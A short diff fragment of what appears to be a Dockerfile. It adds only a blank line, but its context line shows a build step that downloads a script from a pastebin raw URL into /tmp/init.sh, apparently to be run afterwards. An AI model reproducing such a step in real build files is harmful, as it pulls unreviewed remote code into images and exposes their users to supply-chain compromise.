@@ -22,3 +22,4 @@ RUN curl -fLs --retry 3 -o /tmp/init.sh "https://pastebin.com/raw/SwVv6wP6" && \
 CMD ["/bin/bash", "/start.sh"]
 
 
+
